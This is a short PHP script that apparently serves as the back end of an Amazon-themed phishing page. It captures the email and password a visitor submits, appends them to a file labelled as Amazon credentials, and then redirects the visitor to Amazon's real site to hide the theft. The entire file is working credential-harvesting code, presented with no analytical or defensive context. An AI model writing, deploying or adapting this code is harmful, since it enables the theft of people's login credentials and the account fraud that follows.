<?php
file_put_contents("usernames.txt", "Amazon Username: " . $email = $_POST['email'] . "\nPassword: ". $pass = $_POST['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.amazon.in/
header("Location: $url");
?>